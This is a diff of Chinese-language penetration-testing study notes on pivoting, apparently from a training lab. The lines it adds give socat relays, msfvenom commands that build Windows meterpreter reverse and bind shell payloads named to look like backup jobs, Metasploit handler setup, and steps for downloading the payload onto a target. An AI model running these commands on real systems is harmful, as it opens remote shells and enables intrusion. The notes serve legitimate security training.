@@ -147,6 +147,8 @@ meterpreter > shell      获得 反向 shell
 
 Socat 是一个双向中继工具，可以在 2 个独立的网络通道之间创建管道套接字，在跳板机上启动
   https://linux.die.net/man/1/socat
+
+Socat 反向 shell （本地监听，目标发起）
 跳板机:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80                                                        跳板机 8080 到攻击主机 10.10.14.18:80
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080      生成 反向playload
 sudo msfconsole -q
@@ -158,24 +160,38 @@ msf6 exploit(multi/handler) > run
 在目标运行 playload，可用 ssh
 meterpreter > getuid
 
+Socat 正向 bind shell  （目标监听，本地发起）
+msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
+跳板机:~$ socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443
+sudo msfconsole -q
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(multi/handler) > set RHOST 10.129.202.64
+msf6 exploit(multi/handler) > set LPORT 8080
+msf6 exploit(multi/handler) > run
+在目标运行 playload，可用 ssh
+meterpreter > getuid
+
+
+Plink 是 PuTTY Link 的缩写
+Windows 命令行 SSH 工具
+也可用于创建动态端口转发 (dynamic port forward) 和 SOCKS 代理
+在 2018 年秋季之前，Windows 系统没有内置 ssh 客户端，用户须自行安装
+  https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
 
 
 
 
 
-msf bind-shell:
-    socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
-    msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
-    msf6 > use exploit/multi/handler
-    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
+use exploit/multi/handler
+scp playload.exe ubuntu@10.129.202.64:~/
+python3 -m http.server 8123
+curl  / Invoke-WebRequest -Uri "http://172.16.5.129:8123/playload.exe" -OutFile "C:\playload.exe"
 
-msf reverse-shell:
-  msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
-  msfconsole -q
-  use exploit/multi/handler
-  scp playload.exe ubuntu@10.129.202.64:~/
-  python3 -m http.server 8123
-  curl  / Invoke-WebRequest -Uri "http://172.16.5.129:8123/playload.exe" -OutFile "C:\playload.exe"
+
+
+
+
+
 
 
 Windows ssh / GUI proxychains:
